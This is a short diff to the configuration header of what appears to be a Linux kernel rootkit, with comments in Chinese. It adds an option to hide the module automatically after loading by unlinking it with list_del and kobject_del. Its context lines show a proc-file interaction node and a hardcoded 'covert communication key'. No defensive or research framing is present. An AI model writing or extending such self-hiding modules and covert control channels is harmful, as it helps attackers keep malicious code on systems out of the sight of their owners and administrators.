@@ -7,6 +7,8 @@
 
 // 生成proc用户层交互节点文件
 #define CONFIG_USE_PROC_FILE_NODE
+// 模块加载后自动隐藏（list_del + kobject_del）
+#define CONFIG_AUTO_HIDE_MODULE
 // 隐蔽通信密钥
 #define CONFIG_PROC_NODE_AUTH_KEY "9c7e1a3b5d0f2c8e4a6b1d9f3e7c0a2b"
 
